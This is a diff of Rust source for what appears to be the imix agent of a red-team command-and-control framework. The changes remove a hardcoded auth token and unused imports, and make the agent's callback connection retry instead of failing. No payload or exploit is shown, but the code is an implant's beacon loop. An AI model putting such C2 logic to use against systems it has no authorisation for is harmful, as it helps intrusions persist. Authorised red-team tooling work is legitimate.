@@ -14,8 +14,6 @@ use std::thread;
 use std::time::Instant;
 use std::{collections::HashMap, fs};
 use sys_info::{linux_os_release, os_release};
-// use tavern::{ClaimTasksInput, HostPlatform, SubmitTaskResultInput, Task};
-use hyper::client;
 use tokio::task::{self, JoinHandle};
 use tokio::time::Duration;
 use uuid::Uuid;
@@ -71,7 +69,6 @@ async fn handle_exec_tome(
         Ok(local_thread_res) => local_thread_res,
         Err(_) => todo!(),
     };
-    // let res = eldritch_run(tome_name, tome_contents, task_quest.parameters, &print_handler);
     match res {
         Ok(tome_output) => Ok((tome_output, "".to_string())),
         Err(tome_error) => Ok(("".to_string(), tome_error.to_string())),
@@ -197,8 +194,7 @@ fn get_os_pretty_name() -> Result<String> {
 async fn main_loop(config_path: String, loop_count_max: Option<i32>) -> Result<()> {
     let debug = true;
     let mut loop_count: i32 = 0;
-    let version_string = "v0.1.0";
-    let auth_token = "letmeinnn";
+    let version_string = "v0.0.3";
     let config_file = File::open(config_path)?;
     let imix_config: imix::Config = serde_json::from_reader(config_file)?;
 
@@ -303,7 +299,15 @@ async fn main_loop(config_path: String, loop_count_max: Option<i32>) -> Result<(
         // 1a) calculate callback uri
         let cur_callback_uri = imix_config.callback_config.c2_configs[0].uri.clone();
 
-        let mut tavern_client = C2Client::connect(cur_callback_uri.clone()).await?;
+        let mut tavern_client = match C2Client::connect(cur_callback_uri.clone()).await {
+            Ok(tavern_client_local) => tavern_client_local,
+            Err(err) => {
+                if debug {
+                    println!("failed to create tavern client {}", err)
+                }
+                continue;
+            }
+        };
 
         if debug {
             println!(
@@ -596,10 +600,6 @@ mod tests {
     use super::*;
     use httptest::matchers::matches;
     use httptest::{all_of, matchers::request, responders::status_code, Expectation, Server};
-    use tavern::{
-        ClaimTasksResponseData, GraphQLResponse, Quest, SubmitTaskResult,
-        SubmitTaskResultResponseData, Tome,
-    };
     use tempfile::NamedTempFile;
 
     #[test]
